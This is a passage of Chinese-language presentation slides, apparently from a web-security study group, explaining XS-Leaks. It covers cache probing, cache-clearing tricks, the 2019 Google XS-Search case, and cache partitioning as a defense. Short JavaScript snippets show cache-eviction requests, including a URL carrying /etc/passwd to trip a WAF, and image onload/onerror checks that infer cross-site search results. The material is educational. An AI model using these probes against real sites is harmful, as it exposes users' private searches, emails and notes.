</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="104" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="104" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="%E5%95%8F%E9%A1%8C-3">問題</h3>
<ul>
<li>圖片首次載入後會存於快取，無法重複攻擊。</li>
</ul>
<h3 id="%E8%A7%A3%E6%B3%95">解法</h3>
<ul>
<li>
<p>因網站放在 Cloudflare 上面而且有打開 WAF，會阻擋可疑的 URL ，例如<code>https://example.com/high.png?/etc/passwd</code>的/etc/passwd</p>
</li>
<li>
<p>在頁面最後上加上 ?etc/passwd，伺服器會攔截並返回 403，清除圖片快取</p>
</li>
</ul>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>fetch(url, {
  cache: 'reload',
  mode: 'no-cors',
  referrerPolicy: 'unsafe-url'
});
</code></pre>
<ul>
<li>重點是 referrerPolicy 的設置，再送出後會有 referrer header ，內容含有/etc/passwd 伺服器就會擋下來，回傳錯誤，清掉快取。</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="105" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="105" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="cache-probing-%E5%8A%A0-error-event%E8%B9%A6%E5%87%BA%E6%96%B0%E6%BB%8B%E5%91%B3">Cache probing 加 error event，蹦出新滋味</h1>
<h3 id="%E5%89%8D%E8%A8%80-1">前言</h3>
<p>上面說到利用時間差來知道資料是否在快取，但有時候會因為網路的不確定性影響，比較難判斷出哪一個是快取資源，下面要來介紹另一種方法結合 cache probing 與 <code>&lt;img&gt;</code> 的 onerror 和 onload 事件，判斷資源是否來自快取。</p>
<h3 id="%E6%83%85%E5%A2%83-8">情境</h3>
<ul>
<li>網站頁面：<code>https://app.huli.tw/search?q=abc</code></li>
<li>根據搜尋結果，顯示不同內容 :
<ul>
<li>有結果：載入 <code>https://app.huli.tw/found.png</code></li>
<li>無結果：不顯示圖片，也不請求圖片資源。</li>
</ul>
</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="106" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="106" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B-1">攻擊流程</h3>
<ol>
<li>清除快取</li>
</ol>
<ul>
<li>方法 : 利用 request 太大來強制伺服器回傳錯誤</li>
</ul>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>// 程式碼改寫自 https://github.com/xsleaks/xsleaks/wiki/Browser-Side-Channels#cache-and-error-events
let url = 'https://app.huli.tw/found.png';

// 這行可以在 URL 後面加上一堆逗號，送出去的 request 的 referrer 就會太大
history.replaceState(1,1,Array(16e3));

// 發出 request
await fetch(url, {cache: 'reload', mode: 'no-cors'});

</code></pre>
<ol start="2">
<li>觸發快取更新</li>
</ol>
<ul>
<li>載入 <code>https://app.huli.tw/search?q=abc</code></li>
<li>若有搜尋結果，found.png 被載入並存入快取。</li>
<li>若無搜尋結果，圖片資源未載入。</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="107" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="107" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<ol start="3">
<li>驗證圖片是否在快取中</li>
</ol>
<ul>
<li>將網址弄得很長，再度載入圖片，利用 <code>&lt;img&gt; </code>的事件判斷</li>
</ul>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>// 程式碼改寫自 https://github.com/xsleaks/xsleaks/wiki/Browser-Side-Channels#cache-and-error-events
let url = 'https://app.huli.tw/found.png';

history.replaceState(1,1,Array(16e3));
let img = new Image();
img.src = url;
try {
  await new Promise((r, e)=&gt;{img.onerror=e;img.onload=r;});
  alert('Resource was cached'); // Otherwise it would have errored out
} catch(e) {
  alert('Resource was not cached'); // Otherwise it would have loaded
}
</code></pre>
<ul>
<li>onload：圖片來自快取（無需重新請求）</li>
<li>onerror：圖片不在快取，瀏覽器發出請求但失敗</li>
</ul>
<h3 id="%E6%92%87%E9%96%8B%E6%99%82%E9%96%93%E4%B8%8D%E5%AE%89%E5%AE%9A%E5%9B%A0%E7%B4%A0%E7%94%A8%E5%BF%AB%E5%8F%96%E5%8A%A0%E4%B8%8A-error-%E4%BA%8B%E4%BB%B6%E9%81%94%E6%88%90-xs-leaks">撇開時間不安定因素，用快取加上 error 事件達成 XS-Leaks</h3>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="108" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="108" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="%E5%AF%A6%E9%9A%9B%E7%9A%84-google-xs-search-%E6%A1%88%E4%BE%8B">實際的 Google XS-Search 案例</h1>
<h3 id="2019-%E5%B9%B4-massive-xs-search-on-google-products">2019 年 <a href="https://terjanq.medium.com/massive-xs-search-over-multiple-google-products-416e50dd2ec6">Massive XS-Search on Google Products</a></h3>
<ul>
<li>發現者 : terjanq</li>
<li>技術細節 : <a href="https://terjanq.github.io/Bug-Bounty/Google/cache-attack-06jd2d2mz2r0/index.html">Mass XS-Search using Cache Attack</a></li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="109" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="109" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="%E5%8F%97%E5%BD%B1%E9%9F%BF%E7%9A%84-google-%E7%94%A2%E5%93%81">受影響的 Google 產品</h3>
<ul>
<li>My Activity</li>
<li>Gmail</li>
<li>Google Search</li>
<li>Google Books</li>
<li>Google Bookmarks</li>
<li>Google Keep</li>
<li>Google Contacts</li>
<li>YouTube</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="110" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="110" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="%E9%80%8F%E9%81%8E-xs-search-%E7%9A%84%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95%E6%94%BB%E6%93%8A%E8%80%85%E5%8F%AF%E4%BB%A5%E6%8B%BF%E5%88%B0%E7%9A%84%E8%B3%87%E8%A8%8A%E5%8C%85%E6%8B%AC">透過 XS-Search 的攻擊手法，攻擊者可以拿到的資訊包括</h3>
<ul>
<li>搜尋紀錄</li>
<li>看過的影片</li>
<li>email 內容</li>
<li>私人筆記</li>
<li>存在書籤裡的網頁清單</li>
</ul>
<h3 id="%E9%80%99%E9%82%8A%E5%8F%AA%E5%88%97%E5%B9%BE%E5%80%8B%E6%AF%94%E8%BC%83%E5%9A%B4%E9%87%8D%E7%9A%84%E8%B3%87%E8%A8%8A">這邊只列幾個比較嚴重的資訊</h3>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="111" style="--paginate:true;--theme:default;--marpit-advanced-background-split:50%;" data-marpit-pagination-total="123" data-marpit-advanced-background="background" data-marpit-advanced-background-split="right"><div data-marpit-advanced-background-container="true" data-marpit-advanced-background-direction="horizontal"><figure style="background-image:url(&quot;image-5.png&quot;);background-size:contain;"></figure></div></section></foreignObject><foreignObject width="50%" height="720"><section id="111" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="111" style="--paginate:true;--theme:default;--marpit-advanced-background-split:50%;" data-marpit-pagination-total="123" data-marpit-advanced-background="content" data-marpit-advanced-background-split="right">
<h3 id="%E4%BB%A5-gmail-%E7%82%BA%E4%BE%8B">以 Gmail 為例</h3>
<ul>
<li>Gmail 提供進階搜尋功能，URL 包含搜尋條件</li>
<li>搜尋成功時，會出現某一個 icon：<code>https://www.gstatic.com/images/icons/material/system/1x/chevron_left_black_20dp.png</code></li>
<li>利用剛剛手法偵測某個關鍵字是否存在(<a href="https://www.youtube.com/watch?v=H3JTx0JhAng&amp;ab_channel=terjanq">截圖自 POC</a>)<br />
</li>
</ul>
</section>
</foreignObject><foreignObject width="1280" height="720" data-marpit-advanced-background="pseudo"><section data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="111" style="" data-marpit-pagination-total="123" data-marpit-advanced-background="pseudo" data-marpit-advanced-background-split="right"></section></foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="112" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="112" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<ul>
<li>
<p>攻擊流程</p>
<ul>
<li>逐一搜尋，例如「您的密碼是 12345，請小心保管」，從「您的密碼是 1」開始測試，逐一添加字。</li>
<li>根據圖片是否在快取中，確定搜尋是否成功，進一步洩露密碼。</li>
</ul>
</li>
<li>
<p>困難點</p>
<ul>
<li>逐一測試密碼需要時間，且每次攻擊會開啟可疑的新視窗</li>
<li>成功執行攻擊依賴於社交工程技巧（誘導目標開啟頁面）</li>
</ul>
</li>
<li>
<p>解決辦法</p>
<ul>
<li>交由瀏覽器處理，因為像這種涉及多個網站，通常交由瀏覽器改進快取行為</li>
</ul>
</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="113" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="113" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="cache-partitioning">Cache partitioning</h1>
<h3 id="%E5%BF%AB%E5%8F%96%E8%88%8A%E6%A9%9F%E5%88%B6">快取舊機制</h3>
<ul>
<li>上面所說的利用方式都建立在一個前提下，所有網站共用同一塊快取。</li>
</ul>
<h3 id="%E5%BF%AB%E5%8F%96%E6%96%B0%E6%A9%9F%E5%88%B6">快取新機制</h3>
<ul>
<li>2020 年，Chrome 引入 Cache partitioning (快取分區) 機制，讓快取不再共用。</li>
<li>快取的 key 從單一 URL，變成由以下三個值組成的 tuple
<ul>
<li>top-level site：當前最上層的網站。</li>
<li>current-frame site：加載資源的當前 frame 所屬網站。</li>
<li>resource URL：資源的實際 URL。</li>
</ul>
</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="114" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="114" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="%E8%88%89%E4%BE%8B">舉例</h3>
<ul>
<li>情境 : 以前面案子為例，在<code>https://app.huli.tw/search?q=abc</code> 載入圖片 <code>https://app.huli.tw/found.png</code></li>
<li>新機制(快取分區)，快取的 key :
<ul>
<li><code>https://huli.tw</code></li>
<li><code>https://huli.tw</code></li>
<li><code>https://app.huli.tw/found.png</code></li>
</ul>
</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="115" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="115" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<ul>
<li>從另一個<code>https://localhost:5555/exploit.html</code> 的頁面載入圖片，快取 key :
<ul>
<li><code>http://localhost:5555</code></li>
<li><code>http://localhost:5555</code></li>
<li><code>https://app.huli.tw/found.png</code></li>
</ul>
</li>
<li>無快取區分，快取 key 是 URL :<code>https://app.huli.tw/found.png</code></li>
<li>結果 : 因 key 不同，會用不同的快取，所以攻擊者就無法從其他頁面執行 cache probing 攻擊，偵測快取是否存在</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="116" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="116" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="%E5%BF%AB%E5%8F%96%E5%8D%80%E5%88%86%E5%BD%B1%E9%9F%BF">快取區分影響</h3>
<ul>
<li>例如 : CDN 共用問題，cdnjs 提供的 JavaScript 的函式庫（如 jQuery）。</li>
</ul>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js&quot; integrity=&quot;sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
</code></pre>
<ul>
<li>無快取分區：多個網站共用資源快取，提升載入速度。</li>
<li>快取分區：不同網站快取分開會是不同的 key，需重新下載資源，可能增加網路流量與延遲。</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="117" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="117" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="%E4%B8%8D%E8%B6%B3%E7%9A%84%E5%9C%B0%E6%96%B9">不足的地方</h3>
<ul>
<li>若攻擊來自同一站點（same-site），快取分區無法防禦。</li>
<li>例如剛剛的載入圖片，不從 <code>http://localhost:5555</code> 發起攻擊，而是從 <code>https://test.huli.tw</code> 發起攻擊呢?快取的 key 是 :
<ul>
<li><code>https://huli.tw</code></li>
<li><code>https://huli.tw</code></li>
<li><code>https://app.huli.tw/found.png</code></li>
</ul>
</li>
<li>因為跟從 <code>https://app.huli.tw/search?q=abc</code> 載入圖片是一樣的，還是可以執行 cache probing 攻擊。</li>
<li>headless Chrome 預設未啟用快取分區</li>
<li>用 puppeteer 搭配 headless 模式去訪問網站，可拿到通一個快取 key</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="118" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="118" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="%E6%9B%B4%E5%A4%9A-xsleaks">更多 XSLeaks</h1>
<h3 id="%E6%9B%B4%E5%A4%9A-xsleaks-%E5%8F%AF%E5%8F%83%E8%80%83%E5%AF%B6%E5%BA%AB">更多 XSLeaks 可參考寶庫:</h3>
<ul>
<li><a href="https://xsleaks.dev/">XS-Leaks Wiki</a></li>
</ul>
<h3 id="%E7%9B%B8%E9%97%9C%E8%AB%96%E6%96%87">相關論文</h3>
<ul>
<li>標題：《XSinator.com: From a Formal Model to the Automatic Evaluation of Cross-Site Leaks in Web Browsers》</li>
<li>在 2021 年發表，運用自動化的方式找出了許多新的 XSLeaks 方法。</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="119" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="119" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="%E6%AA%A2%E6%B8%AC%E4%B8%8D%E5%90%8C%E7%80%8F%E8%A6%BD%E5%99%A8%E7%89%88%E6%9C%AC%E5%B0%8D-xsleaks-%E7%9A%84%E5%BD%B1%E9%9F%BF">檢測不同瀏覽器版本對 XSLeaks 的影響</h3>
<ul>
<li>網址 : <a href="https://xsinator.com/">https://xsinator.com/</a></li>
<li>可以 leak 的東西分成五種:
<ul>
<li>Status code：基於 HTTP 狀態碼的洩露。</li>
<li>Redirects：利用伺服器端的重定向邏輯（如 Max Redirect Leak）。</li>
<li>API usage：觀察某些 API 是否被調用成功。</li>
<li>Page Content：通過頁面內容的差異進行推測。</li>
<li>HTTP header：基於特定 HTTP 標頭的響應差異進行攻擊</li>
</ul>
</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="120" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="120" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="max-redirect-leak-%E7%9A%84%E7%AF%84%E4%BE%8B">Max Redirect Leak 的範例</h3>
<ul>
<li>重新導向分類中的一種方式</li>
<li>利用重新導向的最大次數限制(20 次)，來偵測某個網頁是不是有進行伺服器端的重新導向</li>
<li>設計一個會重定向 19 次的伺服器，最後一次導向目標網頁(<a href="http://target.com/test%EF%BC%89">http://target.com/test）</a></li>
<li>若目標網頁也執行伺服器端重定向，就會超過限制，Fetch 返回 network error</li>
<li>如果返回錯誤代表事重新導向，不是就沒事。</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="121" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="121" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="%E7%AB%A0%E7%AF%80%E5%9B%9E%E9%A1%A7-5">章節回顧</h1>
<ol>
<li>快取分區（Cache Partitioning）如何幫助防禦 XSLeaks 攻擊？請簡述其原理。</li>
</ol>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="122" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="122" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="thanks-for-listening">Thanks for Listening!</h1>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="123" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="123" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="%E4%B8%8B%E6%AC%A1%E9%A0%90%E5%91%8A">下次預告</h1>
<h2 id="%E6%97%A5%E6%9C%9F--26--%E5%B0%8E%E8%AE%80%E4%BA%BA-lulu--%E7%AD%86%E8%A8%98%E5%B7%A5--yo0">日期 : 2/6 | 導讀人: Lulu | 筆記工 : Yo0</h2>
<h3 id="6-1-%E5%B7%AE%E4%B8%80%E9%BB%9E%E7%9A%84-figma-xss">6-1 差一點的 Figma XSS</h3>
<h3 id="6-2-%E7%B9%9E%E9%81%8E%E5%B1%A4%E5%B1%A4%E9%98%B2%E7%A6%A6--proton-mail-xss">6-2 繞過層層防禦 : Proton Mail XSS</h3>
<h3 id="6-3-%E9%9A%B1%E8%97%8F%E5%9C%A8-payment-%E5%8A%9F%E8%83%BD%E4%B8%AD%E7%9A%84-chrome-%E6%BC%8F%E6%B4%9E">6-3 隱藏在 Payment 功能中的 Chrome 漏洞</h3>
<h3 id="6-1-%E5%BE%9E-prototype-pollition-%E5%88%B0-bitrix24-xss">6-1 從 Prototype Pollition 到 Bitrix24 XSS</h3>
